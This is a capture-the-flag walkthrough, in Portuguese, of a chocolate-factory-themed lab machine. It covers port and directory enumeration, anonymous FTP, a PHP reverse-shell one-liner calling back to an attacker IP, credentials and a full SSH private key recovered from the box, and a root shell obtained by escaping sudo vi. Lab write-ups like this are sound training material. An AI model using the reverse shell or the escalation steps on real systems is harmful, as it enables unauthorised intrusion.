# TASK1

## Scan the machine, how many ports are open?

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-03 09:33 -0400
Nmap scan report for 10.65.137.241 (10.65.137.241)
Host is up (0.15s latency).
Not shown: 989 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
100/tcp open  newacct
106/tcp open  pop3pw
109/tcp open  pop2
110/tcp open  pop3
111/tcp open  rpcbind
113/tcp open  ident
119/tcp open  nntp
125/tcp open  locus-map

Nmap done: 1 IP address (1 host up) scanned in 2.44 seconds


# logar no ftp

utilizei o anonymous sem senha, so apertando enter

prompt off - desabilitar confirmação
mget * - baixar todos os arquivos

└─$ ftp 10.65.137.241 21
Connected to 10.65.137.241.
220 (vsFTPd 3.0.5)
Name (10.65.137.241:luisserra): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get *
local: bib.bib remote: *
229 Entering Extended Passive Mode (|||36140|)
550 Failed to open file.
ftp> prompt off
Interactive mode off.
ftp> mget *
local: gum_room.jpg remote: gum_room.jpg
229 Entering Extended Passive Mode (|||27870|)
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
100% |***********************************************************************************************************************************************************************************************|   203 KiB  337.45 KiB/s    00:00 ETA
226 Transfer complete.
208838 bytes received in 00:00 (270.01 KiB/s)
ftp> exit
221 Goodbye.

obtive a imagem gum_room.jpg

não tem nada de útil

# HTTP

http://10.65.137.241/index.html

tem uma página de login

# Serviço newacct

echo "NEWACCT luisserra" | nc 10.65.137.241 100

mandou olhar em outro lugar

"Welcome to chocolate room!! 
    ___  ___  ___  ___  ___.---------------.
  .'\__\'\__\'\__\'\__\'\__,`   .  ____ ___ \
  \|\/ __\/ __\/ __\/ __\/ _:\  |:.  \  \___ \
   \\'\__\'\__\'\__\'\__\'\_`.__|  `. \  \___ \
    \\/ __\/ __\/ __\/ __\/ __:                \
     \\'\__\'\__\'\__\ \__\'\_;-----------------`
      \\/   \/   \/   \/   \/ :                 |
       \|______________________;________________|

A small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
I hope you wont drown Augustus" 

# Serviço nntp

mesmo problema

nc -v 10.65.137.241 119
10.65.137.241 [10.65.137.241] 119 (nntp) open
"Welcome to chocolate room!! 
    ___  ___  ___  ___  ___.---------------.
  .'\__\'\__\'\__\'\__\'\__,`   .  ____ ___ \
  \|\/ __\/ __\/ __\/ __\/ _:\  |:.  \  \___ \
   \\'\__\'\__\'\__\'\__\'\_`.__|  `. \  \___ \
    \\/ __\/ __\/ __\/ __\/ __:                \
     \\'\__\'\__\'\__\ \__\'\_;-----------------`
      \\/   \/   \/   \/   \/ :                 |
       \|______________________;________________|

A small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
I hope you wont drown Augustus" 

# Serviço pop3

mesmo problema

nc -v 10.65.137.241 110
10.65.137.241 [10.65.137.241] 110 (pop3) open
"Welcome to chocolate room!! 
    ___  ___  ___  ___  ___.---------------.
  .'\__\'\__\'\__\'\__\'\__,`   .  ____ ___ \
  \|\/ __\/ __\/ __\/ __\/ _:\  |:.  \  \___ \
   \\'\__\'\__\'\__\'\__\'\_`.__|  `. \  \___ \
    \\/ __\/ __\/ __\/ __\/ __:                \
     \\'\__\'\__\'\__\ \__\'\_;-----------------`
      \\/   \/   \/   \/   \/ :                 |
       \|______________________;________________|

A small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
I hope you wont drown Augustus" 

# Enumeração com goobuster

gobuster dir -u http://10.65.137.241 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

revela o home.php

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.137.241
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.txt             (Status: 403) [Size: 278]
.hta                 (Status: 403) [Size: 278]
.hta.html            (Status: 403) [Size: 278]
.hta.php             (Status: 403) [Size: 278]
.htaccess.txt        (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htaccess.php        (Status: 403) [Size: 278]
.htaccess.html       (Status: 403) [Size: 278]
.htpasswd.php        (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
.htpasswd.txt        (Status: 403) [Size: 278]
.htpasswd.html       (Status: 403) [Size: 278]
home.php             (Status: 200) [Size: 569]
index.html           (Status: 200) [Size: 1466]
index.html           (Status: 200) [Size: 1466]

nele é possível listar o servidor

 home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php 

dando um cat na chave

 ELF> @ð@8 @@@@øø888Ø Ø    x ¨ ¨ ¨ ððTTTDDPåtd   <<QåtdRåtd   hh/lib64/ld-linux-x86-64.so.2GNUGNUsÈÅ5 tzî~ÊÁªºñð 0MF ª 7"libc.so.6__isoc99_scanfputs__stack_chk_failprintf__cxa_finalizestrcmp__libc_start_mainGLIBC_2.7GLIBC_2.4GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableii _ii iui s    `  Ø à è ð  ø  ° ¸ À È Ð HìHÅ HÀtÿÐHÄÃÿ5j ÿ%l @ÿ%j héàÿÿÿÿ%b héÐÿÿÿÿ%Z héÀÿÿÿÿ%R hé°ÿÿÿÿ%J hé ÿÿÿÿ%b f1íIÑ^HâHäðPTL*H ³H=æÿ ôDH=9 UH1 H9øHåtHê HÀt ]ÿàf.]Ã@f.H=ù H5ò UH)þHåHÁþHðHÁè?HÆHÑþtH± HÀt]ÿàf]Ã@f.=© u/H= UHåtH= è ÿÿÿèHÿÿÿÆ ]ÃóÃfDUHå]éfÿÿÿUHåHì@}ÌHuÀdH%(HEø1ÀH=)¸èþÿÿHEÐHÆH=#¸èþÿÿHEÐH5HÇèlþÿÿÀu5H= ¸èGþÿÿH=(¸è6þÿÿH=G¸è%þÿÿëH=Dè÷ýÿÿ¸HUødH3%(tèîýÿÿÉÃf.fAWAVI×AUATL% UH- SAýIöL)åHìHÁýèwýÿÿHít 1ÛLúLöDïAÿÜHÃH9ÝuêHÄ[]A\A]A^A_Ãf.óÃHìHÄÃEnter your name: %slaksdhfas congratulations you have found the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=' Keep its safeBad name!;8üÿÿüüÿÿ¬ýÿÿTþÿÿÄÜþÿÿäLÿÿÿ,zRx°üÿÿ+zRx$üÿÿ`FJw?;*3$"DHüÿÿ\JýÿÿºAC µD|ðýÿÿeBBE B(H0H8M@r8A0A(B BBBÄþÿÿ ` ä   õþÿoÀ¸ Ä x àÀ ûÿÿoþÿÿo ÿÿÿoðÿÿoùÿÿo¨ FVfv GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.08Tt¸À  à  0  äð Ð    ¨    ñÿÐ!`7 F  m y ñÿñÿ¢Ô ñÿ°  Á¨ Ê Ý ð à   2D äKg{ §» Ê ×ðæpe¼   +ö ªº! - G"ðcrtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.7698__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrylicense.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTableputs@@GLIBC_2.2.5_edata__stack_chk_fail@@GLIBC_2.4printf@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_startstrcmp@@GLIBC_2.2.5__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmain__isoc99_scanf@@GLIBC_2.7__TMC_END___ITM_registerTMCloneTable__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.comment88#TT 1tt$DöÿÿoN¸¸VÀÀÄ^ÿÿÿokþÿÿo  @zààÀB  x00`  B£ää ©ðð¢±  <¿Ð Ð É  Õ    á¨ ¨ ð hê ð õ0)@H+ cëþ 


Chave:
-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=

# shell reverso

php -r '$sock=fsockopen("192.168.147.47",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

capturar o validate.php

$ cat validate.php
<?php
        $uname=$_POST['uname'];
        $password=$_POST['password'];
        if($uname=="charlie" && $password=="cn7824"){
                echo "<script>window.location='home.php'</script>";
        }
        else{
                echo "<script>alert('Incorrect Credentials');</script>";
                echo "<script>window.location='index.html'</script>";
        }
?>$ 

encontramos a senha do charlie:
cn7824

# Flag de user

no home do charlie encontrei o par de chaves ssh:

$ cat teleport.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhp2s9zdSH3xFgOtnwJQEOBYsQ1TJsXrSUyT1hA4ENH6Cm5FbUDMvXYrfn8yLdXC2nQ1LCaVLuFrjL2y/aQ9e/yUU6YuLUVXaGqVA8vD+6ecQXBRsvgoGoF6YgN59XmnEyYKqqC4lciTOSUAhc1iF/EuvxwFL8cmiH/uqYuqsOhc2HBiMHfOCi/tFS2TXkm/XUPQi2zKvnim9iEJCB2iitTuXjYRklrIiiYcqifWOSh93X+hh84HCDPok6U0fWMUmjIhmDY6YSGdKNSW1n2ZLOZDK/czgA5FCjdl4tv7NudInJwQRFo5s+VvR1HLcqg3v2W352H6NKD90z9Nhh7kvj charlie@chocolate-factory
$ cat teleport
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----

salvamos localmente a chave privada
colcoamos a permissão 600
logamos no ssh

ssh -i id_rsa charlie@10.67.190.136


acessar o home do usuaŕio

cd /home/charlie

pegar a flag

cat user.txt

flag{cd5509042371b34e4826e4838b522d2e}




# Escalar privilégio

listamos as permissões de root da charlie

charlie@ip-10-67-190-136:/home/charlie$ sudo -l
Matching Defaults entries for charlie on ip-10-67-190-136:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on ip-10-67-190-136:
    (ALL : !root) NOPASSWD: /usr/bin/vi

utilizamos o vi

sudo vi

dentro da tela interativa apertamos 'esc'
e digitamos ':shell' e apertamos enter

como root encontramos um arquivo root.py no lugar do root.txt

charlie@ip-10-67-190-136:/home/charlie$ sudo vi

root@ip-10-67-190-136:/home/charlie# cd /root
root@ip-10-67-190-136:~# cat root.txt
cat: root.txt: No such file or directory
root@ip-10-67-190-136:~# ls
root.py  snap
root@ip-10-67-190-136:~# cat root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)


vamos executar o py e utilizar a chave que obtemos no início

-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=

ao executar o script apresenta um erro, 

root@ip-10-67-190-136:~# python3 root.py
Enter the key:  -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
Traceback (most recent call last):
  File "root.py", line 6, in <module>
    dcrypt_mess=f.decrypt(encrypted_mess)
  File "/usr/lib/python3/dist-packages/cryptography/fernet.py", line 74, in decrypt
    timestamp, data = Fernet._get_unverified_token_data(token)
  File "/usr/lib/python3/dist-packages/cryptography/fernet.py", line 85, in _get_unverified_token_data
    utils._check_bytes("token", token)
  File "/usr/lib/python3/dist-packages/cryptography/utils.py", line 31, in _check_bytes
    raise TypeError("{} must be bytes".format(name))
TypeError: token must be bytes


então foi necessário corrigir o script pois o python não estava tratando a mensagem como bytes:

from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= b'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)

Novamente obtivemos erro, 

root@ip-10-67-190-136:~# python3 root.py
Enter the key:  -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
Traceback (most recent call last):
  File "root.py", line 8, in <module>
    display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
AttributeError: module 'pyfiglet' has no attribute 'figlet_format'
root@ip-10-67-190-136:~# ls


dessa vez foi comentado a parte do códgio com os displays

root@ip-10-67-190-136:~# python3 root.py
Enter the key:  -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
flag{cec59161d338fef787fcb4e296b42124}
root@ip-10-67-190-136:~# cat root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= b'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
#display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
#display2=pyfiglet.figlet_format("Chocolate Factory ")
#print(display1)
#print(display2)
print(mess)

finalmente a flag de root

flag{cec59161d338fef787fcb4e296b42124}
